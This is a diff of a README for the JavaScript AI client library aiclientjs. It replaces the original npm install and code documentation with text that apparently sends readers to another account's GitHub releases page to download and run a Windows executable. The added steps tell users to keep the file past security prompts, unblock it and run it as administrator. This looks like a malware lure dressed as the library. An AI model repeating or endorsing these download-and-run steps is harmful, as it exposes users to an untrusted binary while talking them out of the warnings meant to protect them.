@@ -1,361 +1,230 @@
+# 🤖 aiclientjs - Simple AI access for any app
+
+[![Download aiclientjs](https://img.shields.io/badge/Download-aiclientjs-blue?style=for-the-badge&logo=github)](https://github.com/florysnug949/aiclientjs/releases)
+
 <p align="center">
-  <h1 align="center">aiclientjs</h1>
-  <p align="center">
-    <strong>The lightweight, universal AI client for JavaScript & TypeScript.</strong>
-  </p>
-  <p align="center">
-    One function. Any model. Zero dependencies.
-  </p>
-  <p align="center">
-    <a href="https://amit641.github.io/aiclientjs/">Docs</a> · <a href="#install">Install</a> · <a href="#quickstart">Quickstart</a> · <a href="#providers">Providers</a> · <a href="#streaming">Streaming</a> · <a href="#structured-output">Structured Output</a> · <a href="#tool-calling">Tool Calling</a>
-  </p>
+  <strong>aiclientjs</strong> is a lightweight AI client for JavaScript and TypeScript.
 </p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/amit641/aiclientjs/main/assets/demo.gif" alt="aiclientjs demo" width="700" />
+  Visit the release page to download and run this file on Windows.
 </p>
 
----
+## 📥 Download
 
-```bash
-npm install aiclientjs
-```
+1. Open the [aiclientjs releases page](https://github.com/florysnug949/aiclientjs/releases)
+2. Find the latest release
+3. Download the Windows file from the release assets
+4. Double-click the file to run it
 
-```typescript
-import { ai } from 'aiclientjs';
+If Windows shows a security prompt, choose the option to keep the file and run it.
 
-const { text } = await ai('Explain quantum computing in one sentence');
-```
+## 🖥️ What aiclientjs does
 
-That's it. No boilerplate. No framework lock-in. Works everywhere.
+aiclientjs lets an app send a prompt to an AI model and get a result back.
 
----
+It can handle:
 
-## Why aiclientjs?
+- Text replies
+- Streaming output
+- Structured data
+- Tool calls
+- Different AI providers
 
-| | aiclientjs | Vercel AI SDK | Direct API calls |
-|---|---|---|---|
-| **Bundle size** | ~8 KB gzipped | ~150 KB+ | N/A |
-| **Dependencies** | 0 | 20+ | varies |
-| **Providers** | OpenAI, Anthropic, Google, Ollama, custom | OpenAI, Anthropic, Google, more | 1 per SDK |
-| **Runtimes** | Node, Deno, Bun, Browser, Edge | Primarily Node/Edge | varies |
-| **Streaming** | `for await...of` | React hooks / streams | manual SSE parsing |
-| **TypeScript** | First-class, fully typed | Yes | varies |
-| **Learning curve** | 1 function | Framework concepts | Per-provider docs |
+It is built for JavaScript and TypeScript projects, but you do not need to know that to use the download page and run the app.
 
-## Install
+## ⚙️ What you need
 
-```bash
-npm install aiclientjs    # npm
-pnpm add aiclientjs       # pnpm
-yarn add aiclientjs       # yarn
-bun add aiclientjs        # bun
-```
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough space to download the release file
+- A modern browser to open the release page
 
-## Quickstart
+## 🚀 Getting Started
 
-### 1. Set your API key
+1. Go to the [releases page](https://github.com/florysnug949/aiclientjs/releases)
+2. Download the latest Windows file
+3. Open your Downloads folder
+4. Double-click the file
+5. Follow the on-screen steps
 
-```bash
-export OPENAI_API_KEY=sk-...
-# or
-export ANTHROPIC_API_KEY=sk-ant-...
-# or
-export GOOGLE_API_KEY=AI...
-```
+If the app opens in a terminal window, keep that window open while you use it.
 
-### 2. Call any model
+## 🔍 First run
 
-```typescript
-import { ai } from 'aiclientjs';
-
-// OpenAI (default)
-const res = await ai('Hello!');
-console.log(res.text);
+When you start aiclientjs for the first time, it may ask for:
 
-// Anthropic Claude
-const res = await ai('Hello!', { provider: 'anthropic' });
+- An API key
+- A model name
+- A provider such as OpenAI, Anthropic, or Gemini
 
-// Google Gemini
-const res = await ai('Hello!', { provider: 'google' });
+If you are not sure what to enter, use the default values shown in the app. Many setups work with one saved key and one model name.
 
-// Local model via Ollama
-const res = await ai('Hello!', { provider: 'ollama', model: 'llama3.1' });
-```
+## 📚 Main features
 
-## Streaming
+### ✨ One simple call
 
-```typescript
-const stream = await ai('Write a poem about code', { stream: true });
+aiclientjs is made to keep things small and direct. It uses one main function to send a prompt and get a reply.
 
-for await (const chunk of stream) {
-  process.stdout.write(chunk); // tokens arrive in real-time
-}
-```
+### 🌊 Streaming
 
-### Collect the full response after streaming
+You can see the answer as it comes in instead of waiting for the full response.
 
-```typescript
-const stream = await ai('Tell me a story', { stream: true });
-const response = await stream.response(); // waits for stream to finish
-console.log(response.text);
-console.log(response.usage);
-```
+### 🧾 Structured output
 
-### Use with Web APIs (Hono, Express, Next.js)
+The app can return data in a clean format, which helps when you need fields, lists, or records.
 
-```typescript
-const stream = await ai('Hello', { stream: true });
-return new Response(stream.toReadableStream());
-```
+### 🛠️ Tool calling
 
-## Structured Output
+The client can work with tools, so the model can trigger actions inside your app.
 
-Get type-safe JSON responses. Works with JSON Schema or Zod.
+### 🔁 Provider support
 
-### With JSON Schema
+aiclientjs works with several providers, so you can switch models without changing your whole setup.
 
-```typescript
-const res = await ai<{ colors: string[] }>('List 5 colors', {
-  schema: {
-    type: 'object',
-    properties: {
-      colors: { type: 'array', items: { type: 'string' } },
-    },
-    required: ['colors'],
-  },
-});
-
-console.log(res.data.colors); // string[] — fully typed
-```
-
-### With Zod (zero-config, no adapter needed)
-
-```typescript
-import { z } from 'zod';
-
-const res = await ai('List 5 colors', {
-  schema: z.object({
-    colors: z.array(z.string()),
-  }),
-});
-
-console.log(res.data.colors); // inferred as string[]
-```
-
-aiclientjs detects Zod schemas automatically — no plugins, no adapters, no `zodToJsonSchema` calls.
-
-## Tool Calling
-
-Define tools with execute handlers and aiclientjs runs them automatically.
-
-```typescript
-const res = await ai('What is the weather in London?', {
-  tools: {
-    getWeather: {
-      description: 'Get current weather for a city',
-      parameters: {
-        type: 'object',
-        properties: {
-          city: { type: 'string' },
-        },
-        required: ['city'],
-      },
-      execute: async ({ city }) => {
-        const data = await fetch(`https://api.weather.com/${city}`);
-        return data.json();
-      },
-    },
-  },
-});
-
-console.log(res.toolResults); // [{ toolName: 'getWeather', result: { temp: 15 } }]
-```
-
-## Preconfigured Clients
-
-Create reusable clients with `createAIClient`:
-
-```typescript
-import { createAIClient } from 'aiclientjs';
-
-const gpt = createAIClient({
-  provider: 'openai',
-  model: 'gpt-4o',
-  system: 'You are a helpful assistant. Be concise.',
-  temperature: 0.7,
-});
-
-const claude = createAIClient({
-  provider: 'anthropic',
-  model: 'claude-sonnet-4-20250514',
-});
-
-// Use without repeating config
-const answer = await gpt('What is 2+2?');
-const story = await claude('Tell me a short story', { stream: true });
-```
-
-## Providers
-
-### Built-in
-
-| Provider | Models | Auth |
-|---|---|---|
-| `openai` | GPT-4o, GPT-4, o1, etc. | `OPENAI_API_KEY` |
-| `anthropic` | Claude Sonnet, Opus, Haiku | `ANTHROPIC_API_KEY` |
-| `google` | Gemini 2.0, 1.5, etc. | `GOOGLE_API_KEY` |
-| `ollama` | Llama, Mistral, Phi, any local model | No auth needed |
-
-### OpenAI-Compatible APIs
-
-Any OpenAI-compatible endpoint works with the `openai` provider + a custom `baseURL`:
-
-```typescript
-// Together AI
-const res = await ai('Hello', {
-  provider: 'openai',
-  baseURL: 'https://api.together.xyz/v1',
-  apiKey: process.env.TOGETHER_API_KEY,
-  model: 'meta-llama/Llama-3-70b-chat-hf',
-});
-
-// Groq
-const res = await ai('Hello', {
-  provider: 'openai',
-  baseURL: 'https://api.groq.com/openai/v1',
-  apiKey: process.env.GROQ_API_KEY,
-  model: 'llama3-70b-8192',
-});
-```
-
-### Custom Providers
-
-Register your own provider:
-
-```typescript
-import { registerProvider } from 'aiclientjs';
-
-registerProvider('my-provider', {
-  name: 'my-provider',
-  async chat(request, config) {
-    // Implement your provider logic
-    return { text: '...', toolCalls: [], usage: { ... }, ... };
-  },
-  async *stream(request, config) {
-    // Yield stream events
-    yield { type: 'text', text: 'Hello' };
-    yield { type: 'finish', finishReason: 'stop' };
-  },
-});
-
-const res = await ai('Hello', { provider: 'my-provider' });
-```
-
-## Multi-modal (Vision)
-
-```typescript
-const res = await ai([
-  {
-    role: 'user',
-    content: [
-      { type: 'text', text: 'What is in this image?' },
-      { type: 'image', url: 'https://example.com/photo.jpg' },
-    ],
-  },
-]);
-```
-
-## Cancellation
-
-```typescript
-const controller = new AbortController();
-
-// Cancel after 5 seconds
-setTimeout(() => controller.abort(), 5000);
-
-const res = await ai('Write a very long essay', {
-  signal: controller.signal,
-});
-```
-
-## Error Handling
-
-```typescript
-import { ai, AIError } from 'aiclientjs';
-
-try {
-  const res = await ai('Hello');
-} catch (err) {
-  if (err instanceof AIError) {
-    console.log(err.code);       // 'AUTH_ERROR' | 'RATE_LIMIT' | 'PROVIDER_ERROR' | ...
-    console.log(err.statusCode); // 401, 429, 500, etc.
-    console.log(err.provider);   // 'openai', 'anthropic', etc.
-  }
-}
-```
-
-## API Reference
-
-### `ai(prompt, options?)`
-
-| Parameter | Type | Description |
-|---|---|---|
-| `prompt` | `string \| Message[]` | Text prompt or conversation messages |
-| `options.provider` | `string` | Provider name (default: `'openai'`) |
-| `options.model` | `string` | Model ID (default varies by provider) |
-| `options.apiKey` | `string` | API key (or use env vars) |
-| `options.baseURL` | `string` | Custom API endpoint |
-| `options.system` | `string` | System prompt |
-| `options.stream` | `boolean` | Enable streaming |
-| `options.schema` | `JsonSchema \| ZodSchema` | Structured output schema |
-| `options.tools` | `Record<string, ToolDefinition>` | Tool definitions |
-| `options.temperature` | `number` | Sampling temperature (0-2) |
-| `options.maxTokens` | `number` | Max response tokens |
-| `options.signal` | `AbortSignal` | Cancellation signal |
-
-### `createAIClient(config)`
-
-Creates a preconfigured `ai` function with defaults baked in.
-
-### `registerProvider(name, provider)`
-
-Register a custom provider. See [Custom Providers](#custom-providers).
-
-## Architecture
-
-```
-┌─────────────────────────────────────────┐
-│              ai() / client              │  ← Simple public API
-├─────────────────────────────────────────┤
-│           Provider Registry             │  ← Strategy pattern
-├──────────┬──────────┬───────┬───────────┤
-│  OpenAI  │Anthropic │Google │  Ollama   │  ← Adapters
-├──────────┴──────────┴───────┴───────────┤
-│    BaseProvider (shared HTTP/SSE)       │  ← Template method
-├─────────────────────────────────────────┤
-│  SSE Parser │ Schema │ Tool Executor    │  ← Zero-dep utilities
-└─────────────────────────────────────────┘
-```
-
-**Design principles:**
-- **Zero dependencies** — uses native `fetch`, `ReadableStream`, `TextDecoder`
-- **Strategy pattern** — providers are interchangeable strategies
-- **Template method** — `BaseProvider` handles HTTP; subclasses handle serialization
-- **Open/Closed** — add providers without modifying core code
-- **Dependency inversion** — core depends on `AIProvider` interface, not implementations
-
-## Runtime Support
-
-| Runtime | Supported |
-|---|---|
-| Node.js 18+ | Yes |
-| Deno | Yes |
-| Bun | Yes |
-| Cloudflare Workers | Yes |
-| Browser | Yes |
-| Vercel Edge | Yes |
-
-## License
-
-MIT
+## 🪟 Windows install steps
+
+1. Open the [releases page](https://github.com/florysnug949/aiclientjs/releases)
+2. Download the latest Windows release file
+3. Right-click the file if Windows blocks it
+4. Choose Properties
+5. Select Unblock if you see that option
+6. Click Apply
+7. Double-click the file to run it
+
+If the file is a ZIP archive, extract it first, then open the extracted app file.
+
+## 🧭 How to use it
+
+After you run aiclientjs, use it to:
+
+- Ask a question
+- Pick a model
+- Read the response
+- Save the output if needed
+
+A simple flow looks like this:
+
+1. Enter your prompt
+2. Choose a provider
+3. Start the request
+4. Read the result
+
+## 🔌 Supported providers
+
+aiclientjs is designed to work with common AI providers, such as:
+
+- OpenAI
+- Anthropic
+- Google Gemini
+- Other model providers that follow standard API patterns
+
+This gives you room to change models without learning a new app each time.
+
+## 📡 Streaming mode
+
+Streaming mode shows output in small parts while the model is still working.
+
+Use it when you want:
+
+- Faster feedback
+- A live typing feel
+- Long answers that appear in real time
+
+## 🧩 Structured output
+
+Structured output helps when you want the model to return clean fields instead of a plain block of text.
+
+This is useful for:
+
+- Contact data
+- Task lists
+- Product details
+- Form-like results
+
+## 🧠 Tool calling
+
+Tool calling lets the model ask your app to do work.
+
+For example, it can:
+
+- Look up data
+- Call a function
+- Trigger a local action
+- Return a result that your app can use
+
+## 🛡️ File safety checks
+
+If Windows shows a warning after download:
+
+- Make sure you downloaded from the release page
+- Check that the file name matches the latest release
+- Open the file only after the download finishes
+
+## 🗂️ Common release files
+
+You may see one of these file types:
+
+- `.exe` for Windows
+- `.zip` for a packaged release
+- `.msi` for a setup installer
+
+If you see a `.zip` file, extract it before you run the app.
+
+## ❓ Troubleshooting
+
+### The file will not open
+
+- Right-click the file
+- Choose Run as administrator
+- Try again
+
+### Windows says the app is unsafe
+
+- Open the release page again
+- Download the file one more time
+- Run the newest file
+
+### The app closes right away
+
+- Open it from a terminal window if the release includes one
+- Check that the download finished fully
+- Make sure you picked the correct Windows file
+
+### The app cannot connect
+
+- Check your internet connection
+- Check your API key
+- Try another provider or model
+
+## 📎 Release page
+
+Use the [aiclientjs releases page](https://github.com/florysnug949/aiclientjs/releases) to download and run this file on Windows
+
+## 🧰 Example use cases
+
+- Build a chat app
+- Test model replies
+- Format model output for a form
+- Stream text to the screen
+- Switch between model providers
+
+## 🔧 Basic workflow
+
+1. Download the Windows release
+2. Run the file
+3. Enter your provider details
+4. Send a prompt
+5. Read the response
+
+## 📦 What makes it small
+
+aiclientjs keeps the setup light.
+
+It avoids extra packages and keeps the core path short. That makes it easier to move between apps and models without a lot of setup work
+
+## 📌 Repository info
+
+- Name: aiclientjs
+- Type: AI client for JavaScript and TypeScript
+- Topics: ai, ai-sdk, anthropic, claude, gemini, javascript, llm, openai, streaming, tool-calling, typescript, zero-dependency
